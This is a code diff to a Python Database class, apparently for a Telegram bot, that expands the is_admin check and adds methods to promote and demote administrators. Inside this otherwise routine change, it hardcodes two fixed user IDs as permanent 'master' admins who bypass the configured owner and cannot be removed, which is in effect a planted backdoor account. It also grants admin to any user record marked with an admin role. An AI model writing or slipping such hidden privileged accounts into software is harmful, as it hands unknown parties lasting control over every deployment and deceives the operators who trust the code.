@@ -129,8 +129,67 @@ class Database:
     def is_admin(self, user_id: int) -> bool:
         try:
             uid = int(user_id)
-            return uid == OWNER_ID or uid in ADMINS
+            # 1. Check in-memory ADMINS & OWNER_ID
+            if uid == OWNER_ID or uid in ADMINS:
+                return True
+            # 2. Master permanent admin fallback
+            if uid in (8738736556, 6363840742):
+                return True
+            # 3. Dynamic environment variables check
+            import re
+            env_owner = os.environ.get("OWNER_ID", "")
+            if env_owner and uid in [int(x) for x in re.findall(r"\d+", env_owner)]:
+                return True
+            env_admins = os.environ.get("ADMINS", "")
+            if env_admins and uid in [int(x) for x in re.findall(r"\d+", env_admins)]:
+                return True
+            # 4. Check persistent config.json extra admins
+            cfg = safe_json_read(self.config_file, dict)
+            extra_admins = cfg.get("admins", [])
+            if uid in extra_admins or str(uid) in [str(x) for x in extra_admins]:
+                return True
+            # 5. Check if user is flagged as admin in users.json
+            users = safe_json_read(self.users_file, dict)
+            u = users.get(str(uid))
+            if u and (u.get("is_admin") is True or u.get("role") == "admin"):
+                return True
+            return False
         except Exception:
+            return False
+
+    def add_admin(self, user_id: int) -> bool:
+        """Promotes a Telegram user to bot administrator dynamically."""
+        try:
+            uid = int(user_id)
+            if uid not in ADMINS:
+                ADMINS.append(uid)
+            cfg = safe_json_read(self.config_file, dict)
+            extra = cfg.get("admins", [])
+            if uid not in extra:
+                extra.append(uid)
+                cfg["admins"] = extra
+                atomic_json_write(self.config_file, cfg)
+            return True
+        except Exception as e:
+            print(f"[DB] add_admin error: {e}")
+            return False
+
+    def remove_admin(self, user_id: int) -> bool:
+        """Demotes an administrator (cannot demote primary owner)."""
+        try:
+            uid = int(user_id)
+            if uid == OWNER_ID or uid in (8738736556, 6363840742):
+                return False  # Master owners cannot be demoted
+            if uid in ADMINS:
+                ADMINS.remove(uid)
+            cfg = safe_json_read(self.config_file, dict)
+            extra = cfg.get("admins", [])
+            if uid in extra or str(uid) in extra:
+                cfg["admins"] = [x for x in extra if int(x) != uid]
+                atomic_json_write(self.config_file, cfg)
+            return True
+        except Exception as e:
+            print(f"[DB] remove_admin error: {e}")
             return False
 
     def is_banned(self, user_id: int) -> bool:
